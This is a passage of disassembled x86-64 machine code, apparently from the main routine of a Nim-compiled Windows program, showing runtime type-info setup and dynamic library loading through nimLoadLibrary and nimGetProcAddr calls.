  409a12:	c6 05 27 0b 02 00 01 	movb   $0x1,0x20b27(%rip)        # 42a540 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x1e0>
  409a19:	48 c7 05 24 0b 02 00 	movq   $0x30,0x20b24(%rip)        # 42a548 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x1e8>
  409a20:	30 00 00 00 
  409a24:	48 c7 05 e1 09 02 00 	movq   $0x4,0x209e1(%rip)        # 42a410 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0xb0>
  409a2b:	04 00 00 00 
  409a2f:	c6 05 ba 09 02 00 02 	movb   $0x2,0x209ba(%rip)        # 42a3f0 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x90>
  409a36:	48 c7 05 9f 06 02 00 	movq   $0x38,0x2069f(%rip)        # 42a0e0 <NTI__te3W2Tqi7xuJ7rlPtg9al5w_>
  409a3d:	38 00 00 00 
  409a41:	c6 05 a0 06 02 00 11 	movb   $0x11,0x206a0(%rip)        # 42a0e8 <NTI__te3W2Tqi7xuJ7rlPtg9al5w_+0x8>
  409a48:	48 c7 05 3d 0b 02 00 	movq   $0x0,0x20b3d(%rip)        # 42a590 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x230>
  409a4f:	00 00 00 00 
  409a53:	c6 05 16 0b 02 00 02 	movb   $0x2,0x20b16(%rip)        # 42a570 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x210>
  409a5a:	48 c7 05 1b 0f 02 00 	movq   $0x8,0x20f1b(%rip)        # 42a980 <NTI__TjokxNjmnZmr9bygVDVC9bvg_>
  409a61:	08 00 00 00 
  409a65:	c6 05 1c 0f 02 00 16 	movb   $0x16,0x20f1c(%rip)        # 42a988 <NTI__TjokxNjmnZmr9bygVDVC9bvg_+0x8>
  409a6c:	48 c7 05 59 0f 02 00 	movq   $0x0,0x20f59(%rip)        # 42a9d0 <NTI__FEvFMlkqJiSSGVO6HgTv8w_+0x10>
  409a73:	00 00 00 00 
  409a77:	48 c7 05 3e 0f 02 00 	movq   $0x8,0x20f3e(%rip)        # 42a9c0 <NTI__FEvFMlkqJiSSGVO6HgTv8w_>
  409a7e:	08 00 00 00 
  409a82:	66 c7 05 3d 0f 02 00 	movw   $0x312,0x20f3d(%rip)        # 42a9c8 <NTI__FEvFMlkqJiSSGVO6HgTv8w_+0x8>
  409a89:	12 03 
  409a8b:	c6 05 6e 0b 02 00 01 	movb   $0x1,0x20b6e(%rip)        # 42a600 <TM__IP4V1hRabVpf8OnX9bWuPxw_0.2132>
  409a92:	48 c7 05 6b 0b 02 00 	movq   $0x0,0x20b6b(%rip)        # 42a608 <TM__IP4V1hRabVpf8OnX9bWuPxw_0.2132+0x8>
  409a99:	00 00 00 00 
  409a9d:	48 89 3d 6c 0b 02 00 	mov    %rdi,0x20b6c(%rip)        # 42a610 <TM__IP4V1hRabVpf8OnX9bWuPxw_0.2132+0x10>
  409aa4:	48 8d 3d a3 29 00 00 	lea    0x29a3(%rip),%rdi        # 40c44e <.rdata+0x44e>
  409aab:	48 89 3d 66 0b 02 00 	mov    %rdi,0x20b66(%rip)        # 42a618 <TM__IP4V1hRabVpf8OnX9bWuPxw_0.2132+0x18>
  409ab2:	48 8d 3d 47 0b 02 00 	lea    0x20b47(%rip),%rdi        # 42a600 <TM__IP4V1hRabVpf8OnX9bWuPxw_0.2132>
  409ab9:	48 89 3d 18 0f 02 00 	mov    %rdi,0x20f18(%rip)        # 42a9d8 <NTI__FEvFMlkqJiSSGVO6HgTv8w_+0x18>
  409ac0:	48 8d 3d 49 0c 02 00 	lea    0x20c49(%rip),%rdi        # 42a710 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x30>
  409ac7:	48 89 3d 32 0d 02 00 	mov    %rdi,0x20d32(%rip)        # 42a800 <TM__0JXiWyhP5OCO8jWMA6sb1w_2_2.2156>
  409ace:	48 83 c7 60          	add    $0x60,%rdi
  409ad2:	48 89 3d a7 0b 02 00 	mov    %rdi,0x20ba7(%rip)        # 42a680 <TM__0JXiWyhP5OCO8jWMA6sb1w_3_2.2157>
  409ad9:	48 83 c7 30          	add    $0x30,%rdi
  409add:	48 89 3d a4 0b 02 00 	mov    %rdi,0x20ba4(%rip)        # 42a688 <TM__0JXiWyhP5OCO8jWMA6sb1w_3_2.2157+0x8>
  409ae4:	48 8d 3d 95 0b 02 00 	lea    0x20b95(%rip),%rdi        # 42a680 <TM__0JXiWyhP5OCO8jWMA6sb1w_3_2.2157>
  409aeb:	48 89 3d 76 0c 02 00 	mov    %rdi,0x20c76(%rip)        # 42a768 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x88>
  409af2:	48 8d 3d 47 0c 02 00 	lea    0x20c47(%rip),%rdi        # 42a740 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x60>
  409af9:	48 89 3d b8 0b 02 00 	mov    %rdi,0x20bb8(%rip)        # 42a6b8 <NTI__1v9bKyksXWMsm0vNwmZ4EuQ_+0x18>
  409b00:	48 8d 3d 99 0b 02 00 	lea    0x20b99(%rip),%rdi        # 42a6a0 <NTI__1v9bKyksXWMsm0vNwmZ4EuQ_>
  409b07:	48 89 3d 42 0b 02 00 	mov    %rdi,0x20b42(%rip)        # 42a650 <NTI__8Np6tlClE5az1CyqZdN19bQ_+0x10>
  409b0e:	48 8d 3d c0 7a ff ff 	lea    -0x8540(%rip),%rdi        # 4015d5 <Marker_tySequence__8Np6tlClE5az1CyqZdN19bQ>
  409b15:	48 89 05 0c 0c 02 00 	mov    %rax,0x20c0c(%rip)        # 42a728 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x48>
  409b1c:	48 8d 05 ad 0c 02 00 	lea    0x20cad(%rip),%rax        # 42a7d0 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0xf0>
  409b23:	48 89 3d 3e 0b 02 00 	mov    %rdi,0x20b3e(%rip)        # 42a668 <NTI__8Np6tlClE5az1CyqZdN19bQ_+0x28>
  409b2a:	48 8d 3d 0f 0b 02 00 	lea    0x20b0f(%rip),%rdi        # 42a640 <NTI__8Np6tlClE5az1CyqZdN19bQ_>
  409b31:	48 89 05 d0 0c 02 00 	mov    %rax,0x20cd0(%rip)        # 42a808 <TM__0JXiWyhP5OCO8jWMA6sb1w_2_2.2156+0x8>
  409b38:	48 8d 05 15 29 00 00 	lea    0x2915(%rip),%rax        # 40c454 <.rdata+0x454>
  409b3f:	48 c7 05 e6 0c 02 00 	movq   $0x0,0x20ce6(%rip)        # 42a830 <NTI__bGAilYs5sUICRbD13gZaFg_+0x10>
  409b46:	00 00 00 00 
  409b4a:	48 c7 05 cb 0c 02 00 	movq   $0x10,0x20ccb(%rip)        # 42a820 <NTI__bGAilYs5sUICRbD13gZaFg_>
  409b51:	10 00 00 00 
  409b55:	66 c7 05 ca 0c 02 00 	movw   $0x212,0x20cca(%rip)        # 42a828 <NTI__bGAilYs5sUICRbD13gZaFg_+0x8>
  409b5c:	12 02 
  409b5e:	48 c7 05 47 0b 02 00 	movq   $0x0,0x20b47(%rip)        # 42a6b0 <NTI__1v9bKyksXWMsm0vNwmZ4EuQ_+0x10>
  409b65:	00 00 00 00 
  409b69:	48 c7 05 2c 0b 02 00 	movq   $0x10,0x20b2c(%rip)        # 42a6a0 <NTI__1v9bKyksXWMsm0vNwmZ4EuQ_>
  409b70:	10 00 00 00 
  409b74:	66 c7 05 2b 0b 02 00 	movw   $0x312,0x20b2b(%rip)        # 42a6a8 <NTI__1v9bKyksXWMsm0vNwmZ4EuQ_+0x8>
  409b7b:	12 03 
  409b7d:	c6 05 ec 0b 02 00 01 	movb   $0x1,0x20bec(%rip)        # 42a770 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x90>
  409b84:	48 c7 05 e9 0b 02 00 	movq   $0x0,0x20be9(%rip)        # 42a778 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x98>
  409b8b:	00 00 00 00 
  409b8f:	4c 89 3d ea 0b 02 00 	mov    %r15,0x20bea(%rip)        # 42a780 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0xa0>
  409b96:	48 89 35 eb 0b 02 00 	mov    %rsi,0x20beb(%rip)        # 42a788 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0xa8>
  409b9d:	c6 05 fc 0b 02 00 01 	movb   $0x1,0x20bfc(%rip)        # 42a7a0 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0xc0>
  409ba4:	48 c7 05 f9 0b 02 00 	movq   $0x8,0x20bf9(%rip)        # 42a7a8 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0xc8>
  409bab:	08 00 00 00 
  409baf:	4c 89 3d fa 0b 02 00 	mov    %r15,0x20bfa(%rip)        # 42a7b0 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0xd0>
  409bb6:	48 89 1d fb 0b 02 00 	mov    %rbx,0x20bfb(%rip)        # 42a7b8 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0xd8>
  409bbd:	48 c7 05 98 0b 02 00 	movq   $0x2,0x20b98(%rip)        # 42a760 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x80>
  409bc4:	02 00 00 00 
  409bc8:	c6 05 71 0b 02 00 02 	movb   $0x2,0x20b71(%rip)        # 42a740 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x60>
  409bcf:	48 c7 05 66 0a 02 00 	movq   $0x8,0x20a66(%rip)        # 42a640 <NTI__8Np6tlClE5az1CyqZdN19bQ_>
  409bd6:	08 00 00 00 
  409bda:	66 c7 05 65 0a 02 00 	movw   $0x218,0x20a65(%rip)        # 42a648 <NTI__8Np6tlClE5az1CyqZdN19bQ_+0x8>
  409be1:	18 02 
  409be3:	c6 05 26 0b 02 00 01 	movb   $0x1,0x20b26(%rip)        # 42a710 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x30>
  409bea:	48 c7 05 23 0b 02 00 	movq   $0x0,0x20b23(%rip)        # 42a718 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x38>
  409bf1:	00 00 00 00 
  409bf5:	48 89 3d 24 0b 02 00 	mov    %rdi,0x20b24(%rip)        # 42a720 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x40>
  409bfc:	c6 05 cd 0b 02 00 01 	movb   $0x1,0x20bcd(%rip)        # 42a7d0 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0xf0>
  409c03:	48 89 05 de 0b 02 00 	mov    %rax,0x20bde(%rip)        # 42a7e8 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x108>
  409c0a:	48 8d 05 ef 0b 02 00 	lea    0x20bef(%rip),%rax        # 42a800 <TM__0JXiWyhP5OCO8jWMA6sb1w_2_2.2156>
  409c11:	48 89 05 f0 0a 02 00 	mov    %rax,0x20af0(%rip)        # 42a708 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x28>
  409c18:	48 8d 05 c1 0a 02 00 	lea    0x20ac1(%rip),%rax        # 42a6e0 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158>
  409c1f:	48 89 05 12 0c 02 00 	mov    %rax,0x20c12(%rip)        # 42a838 <NTI__bGAilYs5sUICRbD13gZaFg_+0x18>
  409c26:	48 8d 05 63 0e 02 00 	lea    0x20e63(%rip),%rax        # 42aa90 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x30>
  409c2d:	48 89 05 dc 0f 02 00 	mov    %rax,0x20fdc(%rip)        # 42ac10 <TM__gfe9a52b5gJr8GSrnr883iA_2_2.53462>
  409c34:	48 83 c0 60          	add    $0x60,%rax
  409c38:	48 89 05 c1 0d 02 00 	mov    %rax,0x20dc1(%rip)        # 42aa00 <TM__gfe9a52b5gJr8GSrnr883iA_3_2.53463>
  409c3f:	48 8d 05 7a 0d 02 00 	lea    0x20d7a(%rip),%rax        # 42a9c0 <NTI__FEvFMlkqJiSSGVO6HgTv8w_>
  409c46:	48 89 05 b3 0e 02 00 	mov    %rax,0x20eb3(%rip)        # 42ab00 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0xa0>
  409c4d:	48 8d 05 cc 0e 02 00 	lea    0x20ecc(%rip),%rax        # 42ab20 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0xc0>
  409c54:	48 89 05 ad 0d 02 00 	mov    %rax,0x20dad(%rip)        # 42aa08 <TM__gfe9a52b5gJr8GSrnr883iA_3_2.53463+0x8>
  409c5b:	48 8d 05 1e 0d 02 00 	lea    0x20d1e(%rip),%rax        # 42a980 <NTI__TjokxNjmnZmr9bygVDVC9bvg_>
  409c62:	48 89 05 c7 0e 02 00 	mov    %rax,0x20ec7(%rip)        # 42ab30 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0xd0>
  409c69:	48 8d 05 90 0d 02 00 	lea    0x20d90(%rip),%rax        # 42aa00 <TM__gfe9a52b5gJr8GSrnr883iA_3_2.53463>
  409c70:	48 89 05 71 0e 02 00 	mov    %rax,0x20e71(%rip)        # 42aae8 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x88>
  409c77:	48 8d 05 42 0e 02 00 	lea    0x20e42(%rip),%rax        # 42aac0 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x60>
  409c7e:	48 89 05 b3 0d 02 00 	mov    %rax,0x20db3(%rip)        # 42aa38 <NTI__5aoVPIWYzahUyBc9bMm0M5w_+0x18>
  409c85:	48 8d 05 b4 0c 02 00 	lea    0x20cb4(%rip),%rax        # 42a940 <NTI__mgfFdry9aKsRMW9au5u9bSpOQ_>
  409c8c:	48 89 05 0d 0e 02 00 	mov    %rax,0x20e0d(%rip)        # 42aaa0 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x40>
  409c93:	48 8d 05 c2 27 00 00 	lea    0x27c2(%rip),%rax        # 40c45c <.rdata+0x45c>
  409c9a:	48 89 05 07 0e 02 00 	mov    %rax,0x20e07(%rip)        # 42aaa8 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x48>
  409ca1:	48 8d 05 a8 0e 02 00 	lea    0x20ea8(%rip),%rax        # 42ab50 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0xf0>
  409ca8:	48 c7 05 25 0b 02 00 	movq   $0x8,0x20b25(%rip)        # 42a7d8 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0xf8>
  409caf:	08 00 00 00 
  409cb3:	4c 89 3d 26 0b 02 00 	mov    %r15,0x20b26(%rip)        # 42a7e0 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x100>
  409cba:	48 c7 05 3b 0a 02 00 	movq   $0x2,0x20a3b(%rip)        # 42a700 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x20>
  409cc1:	02 00 00 00 
  409cc5:	c6 05 14 0a 02 00 02 	movb   $0x2,0x20a14(%rip)        # 42a6e0 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158>
  409ccc:	48 c7 05 89 0f 02 00 	movq   $0x38,0x20f89(%rip)        # 42ac60 <NTI__YNzlM8oq8NLlO720L2VFMw_>
  409cd3:	38 00 00 00 
  409cd7:	c6 05 8a 0f 02 00 11 	movb   $0x11,0x20f8a(%rip)        # 42ac68 <NTI__YNzlM8oq8NLlO720L2VFMw_+0x8>
  409cde:	48 89 2d 8b 0f 02 00 	mov    %rbp,0x20f8b(%rip)        # 42ac70 <NTI__YNzlM8oq8NLlO720L2VFMw_+0x10>
  409ce5:	48 c7 05 30 0d 02 00 	movq   $0x10,0x20d30(%rip)        # 42aa20 <NTI__5aoVPIWYzahUyBc9bMm0M5w_>
  409cec:	10 00 00 00 
  409cf0:	c6 05 31 0d 02 00 12 	movb   $0x12,0x20d31(%rip)        # 42aa28 <NTI__5aoVPIWYzahUyBc9bMm0M5w_+0x8>
  409cf7:	48 c7 05 2e 0d 02 00 	movq   $0x0,0x20d2e(%rip)        # 42aa30 <NTI__5aoVPIWYzahUyBc9bMm0M5w_+0x10>
  409cfe:	00 00 00 00 
  409d02:	c6 05 e7 0d 02 00 01 	movb   $0x1,0x20de7(%rip)        # 42aaf0 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x90>
  409d09:	48 c7 05 e4 0d 02 00 	movq   $0x0,0x20de4(%rip)        # 42aaf8 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x98>
  409d10:	00 00 00 00 
  409d14:	48 89 35 ed 0d 02 00 	mov    %rsi,0x20ded(%rip)        # 42ab08 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0xa8>
  409d1b:	c6 05 fe 0d 02 00 01 	movb   $0x1,0x20dfe(%rip)        # 42ab20 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0xc0>
  409d22:	48 c7 05 fb 0d 02 00 	movq   $0x8,0x20dfb(%rip)        # 42ab28 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0xc8>
  409d29:	08 00 00 00 
  409d2d:	48 89 1d 04 0e 02 00 	mov    %rbx,0x20e04(%rip)        # 42ab38 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0xd8>
  409d34:	48 c7 05 a1 0d 02 00 	movq   $0x2,0x20da1(%rip)        # 42aae0 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x80>
  409d3b:	02 00 00 00 
  409d3f:	c6 05 7a 0d 02 00 02 	movb   $0x2,0x20d7a(%rip)        # 42aac0 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x60>
  409d46:	c6 05 43 0d 02 00 01 	movb   $0x1,0x20d43(%rip)        # 42aa90 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x30>
  409d4d:	48 c7 05 40 0d 02 00 	movq   $0x8,0x20d40(%rip)        # 42aa98 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x38>
  409d54:	08 00 00 00 
  409d58:	48 89 05 b9 0e 02 00 	mov    %rax,0x20eb9(%rip)        # 42ac18 <TM__gfe9a52b5gJr8GSrnr883iA_2_2.53462+0x8>
  409d5f:	48 8d 05 9a 0b 02 00 	lea    0x20b9a(%rip),%rax        # 42a900 <NTI__oL07LSXp3QMM0uEpFQiyQg_>
  409d66:	48 89 05 f3 0d 02 00 	mov    %rax,0x20df3(%rip)        # 42ab60 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x100>
  409d6d:	48 8d 05 9c 0e 02 00 	lea    0x20e9c(%rip),%rax        # 42ac10 <TM__gfe9a52b5gJr8GSrnr883iA_2_2.53462>
  409d74:	48 89 05 0d 0d 02 00 	mov    %rax,0x20d0d(%rip)        # 42aa88 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x28>
  409d7b:	48 8d 05 de 0c 02 00 	lea    0x20cde(%rip),%rax        # 42aa60 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465>
  409d82:	48 89 05 ef 0e 02 00 	mov    %rax,0x20eef(%rip)        # 42ac78 <NTI__YNzlM8oq8NLlO720L2VFMw_+0x18>
  409d89:	48 8d 05 d0 0e 02 00 	lea    0x20ed0(%rip),%rax        # 42ac60 <NTI__YNzlM8oq8NLlO720L2VFMw_>
  409d90:	48 89 05 39 0b 02 00 	mov    %rax,0x20b39(%rip)        # 42a8d0 <NTI__mNiwh37MfaAP9cG4kqT6kpg_+0x10>
  409d97:	48 8d 05 12 0e 02 00 	lea    0x20e12(%rip),%rax        # 42abb0 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x150>
  409d9e:	48 89 05 fb 0a 02 00 	mov    %rax,0x20afb(%rip)        # 42a8a0 <TM__gfe9a52b5gJr8GSrnr883iA_4_2.53464>
  409da5:	48 8d 05 b7 26 00 00 	lea    0x26b7(%rip),%rax        # 40c463 <.rdata+0x463>
  409dac:	48 89 05 15 0e 02 00 	mov    %rax,0x20e15(%rip)        # 42abc8 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x168>
  409db3:	48 8d 05 26 0e 02 00 	lea    0x20e26(%rip),%rax        # 42abe0 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x180>
  409dba:	48 89 05 e7 0a 02 00 	mov    %rax,0x20ae7(%rip)        # 42a8a8 <TM__gfe9a52b5gJr8GSrnr883iA_4_2.53464+0x8>
  409dc1:	48 8d 05 58 0a 02 00 	lea    0x20a58(%rip),%rax        # 42a820 <NTI__bGAilYs5sUICRbD13gZaFg_>
  409dc8:	48 89 05 21 0e 02 00 	mov    %rax,0x20e21(%rip)        # 42abf0 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x190>
  409dcf:	48 8d 05 94 26 00 00 	lea    0x2694(%rip),%rax        # 40c46a <.rdata+0x46a>
  409dd6:	48 89 05 1b 0e 02 00 	mov    %rax,0x20e1b(%rip)        # 42abf8 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x198>
  409ddd:	48 8d 05 bc 0a 02 00 	lea    0x20abc(%rip),%rax        # 42a8a0 <TM__gfe9a52b5gJr8GSrnr883iA_4_2.53464>
  409de4:	48 89 05 bd 0d 02 00 	mov    %rax,0x20dbd(%rip)        # 42aba8 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x148>
  409deb:	48 8d 05 8e 0d 02 00 	lea    0x20d8e(%rip),%rax        # 42ab80 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x120>
  409df2:	c6 05 57 0d 02 00 01 	movb   $0x1,0x20d57(%rip)        # 42ab50 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0xf0>
  409df9:	48 c7 05 54 0d 02 00 	movq   $0x10,0x20d54(%rip)        # 42ab58 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0xf8>
  409e00:	10 00 00 00 
  409e04:	48 89 15 5d 0d 02 00 	mov    %rdx,0x20d5d(%rip)        # 42ab68 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x108>
  409e0b:	48 c7 05 6a 0c 02 00 	movq   $0x2,0x20c6a(%rip)        # 42aa80 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x20>
  409e12:	02 00 00 00 
  409e16:	c6 05 43 0c 02 00 02 	movb   $0x2,0x20c43(%rip)        # 42aa60 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465>
  409e1d:	48 c7 05 98 0a 02 00 	movq   $0x50,0x20a98(%rip)        # 42a8c0 <NTI__mNiwh37MfaAP9cG4kqT6kpg_>
  409e24:	50 00 00 00 
  409e28:	c6 05 99 0a 02 00 11 	movb   $0x11,0x20a99(%rip)        # 42a8c8 <NTI__mNiwh37MfaAP9cG4kqT6kpg_+0x8>
  409e2f:	c6 05 7a 0d 02 00 01 	movb   $0x1,0x20d7a(%rip)        # 42abb0 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x150>
  409e36:	48 c7 05 77 0d 02 00 	movq   $0x38,0x20d77(%rip)        # 42abb8 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x158>
  409e3d:	38 00 00 00 
  409e41:	4c 89 3d 78 0d 02 00 	mov    %r15,0x20d78(%rip)        # 42abc0 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x160>
  409e48:	c6 05 91 0d 02 00 01 	movb   $0x1,0x20d91(%rip)        # 42abe0 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x180>
  409e4f:	48 c7 05 8e 0d 02 00 	movq   $0x40,0x20d8e(%rip)        # 42abe8 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x188>
  409e56:	40 00 00 00 
  409e5a:	48 c7 05 3b 0d 02 00 	movq   $0x2,0x20d3b(%rip)        # 42aba0 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x140>
  409e61:	02 00 00 00 
  409e65:	c6 05 14 0d 02 00 02 	movb   $0x2,0x20d14(%rip)        # 42ab80 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x120>
  409e6c:	48 89 05 65 0a 02 00 	mov    %rax,0x20a65(%rip)        # 42a8d8 <NTI__mNiwh37MfaAP9cG4kqT6kpg_+0x18>
  409e73:	e8 33 7b ff ff       	call   4019ab <nimLoadLibrary>
  409e78:	48 8d 0d 41 79 00 00 	lea    0x7941(%rip),%rcx        # 4117c0 <TM__SXfl4xjKGDTPbJeR9b1nqCQ_5>
  409e7f:	48 85 c0             	test   %rax,%rax
  409e82:	48 89 05 4f 0e 02 00 	mov    %rax,0x20e4f(%rip)        # 42acd8 <TM__SXfl4xjKGDTPbJeR9b1nqCQ_2>
  409e89:	0f 84 c9 f2 ff ff    	je     409158 <main+0xb08>
  409e8f:	48 8d 15 dc 25 00 00 	lea    0x25dc(%rip),%rdx        # 40c472 <.rdata+0x472>
  409e96:	48 89 c1             	mov    %rax,%rcx
  409e99:	e8 d1 7f ff ff       	call   401e6f <nimGetProcAddr>
  409e9e:	48 8b 0d 33 0e 02 00 	mov    0x20e33(%rip),%rcx        # 42acd8 <TM__SXfl4xjKGDTPbJeR9b1nqCQ_2>
  409ea5:	48 8d 15 d9 25 00 00 	lea    0x25d9(%rip),%rdx        # 40c485 <.rdata+0x485>
  409eac:	48 89 05 1d 0e 02 00 	mov    %rax,0x20e1d(%rip)        # 42acd0 <Dl_25975001_>
  409eb3:	e8 b7 7f ff ff       	call   401e6f <nimGetProcAddr>
  409eb8:	48 8b 0d 19 0e 02 00 	mov    0x20e19(%rip),%rcx        # 42acd8 <TM__SXfl4xjKGDTPbJeR9b1nqCQ_2>
  409ebf:	48 8d 15 d6 25 00 00 	lea    0x25d6(%rip),%rdx        # 40c49c <.rdata+0x49c>
  409ec6:	48 89 05 fb 0d 02 00 	mov    %rax,0x20dfb(%rip)        # 42acc8 <Dl_25965001_>
  409ecd:	e8 9d 7f ff ff       	call   401e6f <nimGetProcAddr>
  409ed2:	48 8b 0d ff 0d 02 00 	mov    0x20dff(%rip),%rcx        # 42acd8 <TM__SXfl4xjKGDTPbJeR9b1nqCQ_2>
  409ed9:	48 8d 15 c9 25 00 00 	lea    0x25c9(%rip),%rdx        # 40c4a9 <.rdata+0x4a9>
  409ee0:	48 89 05 d9 0d 02 00 	mov    %rax,0x20dd9(%rip)        # 42acc0 <Dl_26815001_>
  409ee7:	e8 83 7f ff ff       	call   401e6f <nimGetProcAddr>
  409eec:	48 8b 0d e5 0d 02 00 	mov    0x20de5(%rip),%rcx        # 42acd8 <TM__SXfl4xjKGDTPbJeR9b1nqCQ_2>
  409ef3:	48 8d 15 b6 25 00 00 	lea    0x25b6(%rip),%rdx        # 40c4b0 <.rdata+0x4b0>
  409efa:	48 89 05 b7 0d 02 00 	mov    %rax,0x20db7(%rip)        # 42acb8 <Dl_25910001_>
  409f01:	e8 69 7f ff ff       	call   401e6f <nimGetProcAddr>
  409f06:	48 8b 0d cb 0d 02 00 	mov    0x20dcb(%rip),%rcx        # 42acd8 <TM__SXfl4xjKGDTPbJeR9b1nqCQ_2>
  409f0d:	48 8d 15 ad 25 00 00 	lea    0x25ad(%rip),%rdx        # 40c4c1 <.rdata+0x4c1>
  409f14:	48 89 05 95 0d 02 00 	mov    %rax,0x20d95(%rip)        # 42acb0 <Dl_27160001_>
  409f1b:	e8 4f 7f ff ff       	call   401e6f <nimGetProcAddr>
  409f20:	48 8b 0d b1 0d 02 00 	mov    0x20db1(%rip),%rcx        # 42acd8 <TM__SXfl4xjKGDTPbJeR9b1nqCQ_2>
  409f27:	48 8d 15 9d 25 00 00 	lea    0x259d(%rip),%rdx        # 40c4cb <.rdata+0x4cb>
  409f2e:	48 89 05 73 0d 02 00 	mov    %rax,0x20d73(%rip)        # 42aca8 <Dl_26365001_>
  409f35:	e8 35 7f ff ff       	call   401e6f <nimGetProcAddr>
  409f3a:	48 8b 0d 97 0d 02 00 	mov    0x20d97(%rip),%rcx        # 42acd8 <TM__SXfl4xjKGDTPbJeR9b1nqCQ_2>
  409f41:	48 8d 15 8c 25 00 00 	lea    0x258c(%rip),%rdx        # 40c4d4 <.rdata+0x4d4>
  409f48:	48 89 05 51 0d 02 00 	mov    %rax,0x20d51(%rip)        # 42aca0 <Dl_26115001_>
  409f4f:	e8 1b 7f ff ff       	call   401e6f <nimGetProcAddr>
  409f54:	48 8d 0d c5 78 00 00 	lea    0x78c5(%rip),%rcx        # 411820 <TM__kNniPh4YJmm9aWyhkCQWDNg_4>
  409f5b:	48 89 05 36 0d 02 00 	mov    %rax,0x20d36(%rip)        # 42ac98 <Dl_26125001_>
  409f62:	e8 44 7a ff ff       	call   4019ab <nimLoadLibrary>
  409f67:	48 8d 0d 92 78 00 00 	lea    0x7892(%rip),%rcx        # 411800 <TM__kNniPh4YJmm9aWyhkCQWDNg_5>
  409f6e:	48 85 c0             	test   %rax,%rax
  409f71:	48 89 05 98 0d 02 00 	mov    %rax,0x20d98(%rip)        # 42ad10 <TM__kNniPh4YJmm9aWyhkCQWDNg_2>
  409f78:	0f 84 da f1 ff ff    	je     409158 <main+0xb08>
  409f7e:	48 8d 15 5c 25 00 00 	lea    0x255c(%rip),%rdx        # 40c4e1 <.rdata+0x4e1>
  409f85:	48 89 c1             	mov    %rax,%rcx
  409f88:	e8 e2 7e ff ff       	call   401e6f <nimGetProcAddr>
  409f8d:	48 8b 0d 7c 0d 02 00 	mov    0x20d7c(%rip),%rcx        # 42ad10 <TM__kNniPh4YJmm9aWyhkCQWDNg_2>
  409f94:	48 8d 15 57 25 00 00 	lea    0x2557(%rip),%rdx        # 40c4f2 <.rdata+0x4f2>
  409f9b:	48 89 05 66 0d 02 00 	mov    %rax,0x20d66(%rip)        # 42ad08 <Dl_29815001_>
